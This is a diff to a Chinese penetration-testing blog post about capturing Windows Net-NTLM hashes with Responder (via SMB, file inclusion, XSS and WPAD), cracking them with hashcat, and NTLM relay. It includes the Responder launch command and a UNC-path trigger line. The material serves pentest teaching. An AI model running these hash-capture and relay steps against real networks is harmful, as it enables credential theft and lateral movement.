@@ -1,5 +1,5 @@
 +++
-title = "内网渗透之Responder与NTML hash"
+title = "内网渗透之Responder与Net-NTML hash"
 topics = ["Pentest"]
 tags = ["intranet"]
 description = "获取windows的hash"
@@ -15,10 +15,14 @@ draft = false
 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash
 
 * 什么是Challenge-Response挑战/响应验证机制？  
-    * Client输入username、password、domain，然后将密码hash后存在本地，并将username发送到Server
+    * Client输入username、password、domain，然后将用户名及密码hash后存在本地，并将username发送到Server
     * DC生成一个16字节的随机数，即Challenge(挑战码)，然后传回Client
     * Client收到Challenge后将密码hash和challenge混合hash，混合后的hash称为response，然后将challenge、response和username发送给Server
     * Server将收到的3个值转发给DC，然后DC根据传过来的username到域控的账号数据库ntds.list找到对应的密码hash，将hash和Client传过来的challenge混合hash，将这个混合hash与Client传过来的response进行对比验证
+
+* NTLM Hash与Net-NTLM Hash
+    * NTLM Hash通常是指Windows系统下Security Account Manager中保存的用户密码hash，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash（比如用Mimikatz提取），“挑战/响应验证”中的用户名及密码hash就是NTLM Hash
+    * Net-NTLM Hash通常是指网络环境下NTLM认证中的hash，“挑战/响应验证”中的response中包含Net-NTLM hash，用Responder抓取的就是Net-NTLM Hash
 
 * 关于Responder  
 由Laurent Gaffie撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括Net-NTLM hash）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。Responder也有能力攻击LLMNR，NBT-NS和mDNS等协议。
@@ -32,7 +36,7 @@ draft = false
 * 域控主机：Win2008（10.11.11.18）
 * 被控主机：Ubuntu14.04（10.11.11.11）和目标机同一网段
 
-### 0x02 通过SMB服务获取NTLM hash   
+### 0x02 通过SMB服务获取Net-NTLM hash   
 对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash
 
 ```bash
@@ -87,15 +91,15 @@ netcfg.exe -l \\host\share -c p -i foo
 * 被控主机执行：$ sudo python Responder.py -I eth0 -v
 ![90](/img/post/20180911-124855.png)
 
-### 0x03 通过文件包含获取NTLM hash
+### 0x03 通过文件包含获取Net-NTLM hash
 * 被控主机执行：$ sudo python Responder.py -I eth0 -v
 ![90](/img/post/20180911-132027.png)
 
-### 0x04 通过XSS获取NTLM hash
+### 0x04 通过XSS获取Net-NTLM hash
 * 被控主机执行：$ sudo python Responder.py -I eth0 -v
 ![80](/img/post/20180911-163241.png)
 
-### 0x05 WPAD代理服务器抓取NTLM hash
+### 0x05 WPAD代理服务器抓取Net-NTLM hash
 WPAD用于在windows中自动化的设置ie浏览器的代理，从Windows 2000开始该功能被默认开启。
 
 开启Responder的WPAD后，当PC浏览网站时即可抓取到NTLM hash
@@ -106,9 +110,10 @@ WPAD用于在windows中自动化的设置ie浏览器的代理，从Windows 2000�
 ![90](/img/post/20180911-205517.png)
 ![80](/img/post/20180911-210126.png)
 
+### 0x06 使用hashcat解密
+安装hashcat：[https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going?_blank)
 
-
-### 0x06 通过NTLM中继攻击添加用户
+### 0x07 通过NTLM中继攻击添加用户
 这里就用到了NTLM中继攻击，相当于是中间人攻击，攻击者获取高权限的主机的hash，然后将hash转发给低权限主机并执行命令
 
 这里就是抓取域控的hash，然后执行命令得到域内主机的信息
@@ -226,3 +231,4 @@ reber@ubuntu:~/Responder/tools$
 * [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes?_blank)
 * [https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745](https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745?_blank)
 * [https://www.anquanke.com/post/id/85004](https://www.anquanke.com/post/id/85004?_blank)
+* [https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going?_blank)
